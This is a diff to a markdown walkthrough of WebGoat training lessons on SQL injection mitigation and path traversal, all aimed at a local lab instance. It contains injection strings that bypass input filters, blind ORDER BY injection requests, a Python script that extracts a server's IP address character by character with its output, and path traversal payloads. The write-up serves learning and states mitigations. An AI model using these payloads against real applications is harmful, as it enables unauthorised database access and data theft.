@@ -6,6 +6,7 @@
   - [SQL Injection (intro)](#sql-injection-intro)
   - [SQL Injection (advanced)](#sql-injection-advanced)
   - [SQL Injection (mitigation)](#sql-injection-mitigation)
+  - [Path Traversal](#path-traversal)
 
 <!-- END doctoc generated TOC please keep comment here to allow auto update -->
 
@@ -291,5 +292,180 @@ try{
 ### 7. Parameterized Queries - .NET
 
 ### 8. Is Input Validation Required?
+
+Yes, it prevents other types of attacks from being stored in the database.
+
+### 9. Input validation alone is not enough!!
+
+Vulnerable Code: filters only white spaces, no parameterized queries implemented
+
+Exploit:
+
+```sql
+name: '/**/or/**/1='1
+```
+
+### 10. Input validation alone is not enough!!
+
+Vulnerable Code: performs some input validation, no parameterized queries implemented
+
+Exploit:
+
+```sql
+name: '/**/or/**/1='1
+```
+
+### 11. Order by clause
+
+```sql
+SELECT ...
+FROM tableList
+[WHERE Expression]
+[ORDER BY orderExpression [, ...]]
+
+orderExpression:
+{ columnNr | columnAlias | selectExpression }
+    [ASC | DESC]
+
+selectExpression:
+{ Expression | COUNT(*) | {
+    COUNT | MIN | MAX | SUM | AVG | SOME | EVERY |
+    VAR_POP | VAR_SAMP | STDDEV_POP | STDDEV_SAMP
+} ([ALL | DISTINCT][2]] Expression) } [[AS] label]
+
+Based on HSQLDB
+```
+
+`orderExpression` can be a `selectExpression` which can be a function.
+
+```sql
+SELECT * FROM users ORDER BY (CASE WHEN (TRUE) THEN lastname ELSE firstname END)
+```
+
+We can subsitute any king of boolean operation in the `when()` part.
+
+Implement a white list for values acceptable in the `order by` statement.
+
+### 12.
+
+Find the IP address of `webgoat-prd` (`xxx.130.219.202`).
+
+Default request:
+
+`GET http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=foo HTTP/1.1`
+
+Altered request in order to reveal database query:
+
+```
+GET http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=notExistingColumn HTTP/1.1
+...
+```
+
+Response:
+
+```
+...
+"message" : "Request processing failed; nested exception is java.sql.SQLSyntaxErrorException: user lacks privilege or object not found: NOTEXISTINGCOLUMN in statement [select id, hostname, ip, mac, status, description from servers  where status <> 'out of order' order by notExistingColumn]"
+...
+```
+
+Request for result ordered by id:
+
+```
+GET http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=case+when+true+then+id+else+ip+end HTTP/1.1
+...
+```
+
+Request for result ordered by ip:
+
+```
+GET http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=case+when+false+then+id+else+ip+end HTTP/1.1
+...
+```
+
+SQL query for single character exfiltration:
+
+```sql
+case when((select top 1 substring(ip,0,1) from servers where hostname='webgoat-prd')='1') then id else ip end
+```
+
+Corresponding request:
+
+```
+GET http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=case+when%28%28select+top+1+substring%28ip%2C0%2C1%29+from+servers+where+hostname%3D%27webgoat-prd%27%29%3D%271%27%29+then+id+else+ip+end HTTP/1.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+X-Requested-With: XMLHttpRequest
+Connection: keep-alive
+Referer: https://localhost:8080/WebGoat/start.mvc
+Cookie: JSESSIONID=qjZFwF4-8_OXx2dQEyvs_ar0UCw4tbZBn2kqxsk6
+Content-Length: 0
+Host: localhost:8080
+```
+
+Exploit:
+
+```python
+#!/usr/bin/python3
+
+import requests
+import json
+
+url = "http://localhost:8080/WebGoat/SqlInjectionMitigations/servers"
+headers = {"Cookie":"JSESSIONID=qjZFwF4-8_OXx2dQEyvs_ar0UCw4tbZBn2kqxsk6" }
+
+for position in range(16):
+	for digit in {"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "."}:
+		params = {"column":"case when((select top 1 substring(ip,{},1) from servers where hostname='webgoat-prd')='{}') then id else ip end".format(position,digit)}
+
+		response = requests.get(url, headers=headers, params=params)
+		
+		json_response = json.loads(response.text)
+		
+		if json_response[0]["id"] == '1':
+			print(digit)
+```
+
+Output:
+
+```
+1
+0
+4
+.
+1
+3
+0
+.
+2
+1
+9
+.
+2
+0
+2
+```
+
+### 13. Least Privilege
+
+- Connect with a minimum set of privileges
+- Database accounts should limit schema access
+- Define database accounts for read and read/write access
+- Multiple connection pools based on access
+
+## Path Traversal
+
+### 1. Path Traversal
+
+`../` or `%2e%2e%2f`
+
+### 2. Path traversal while uploading files
+
+Exploit:
+
+Full Name: `../test`
+
+### 3. Path traversal while uploading files
 
 TODO
